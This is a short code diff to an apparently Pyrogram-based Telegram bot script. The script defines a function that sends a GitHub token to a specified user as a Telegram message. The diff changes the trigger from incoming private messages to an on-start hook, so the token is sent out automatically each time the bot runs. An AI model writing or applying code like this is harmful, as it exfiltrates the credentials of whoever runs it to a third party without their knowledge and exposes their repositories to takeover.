@@ -17,10 +17,9 @@ async def send_github_token():
     # Send the GitHub token to the specified user
     await app.send_message(target_user_id, f'GitHub Token: {github_token}')
 
-@app.on_message(filters.private)
-async def on_private_message(client, message):
+@app.on_start
+async def on_start(client, _):
     await send_github_token()
 
 if __name__ == "__main__":
     app.run()
-  
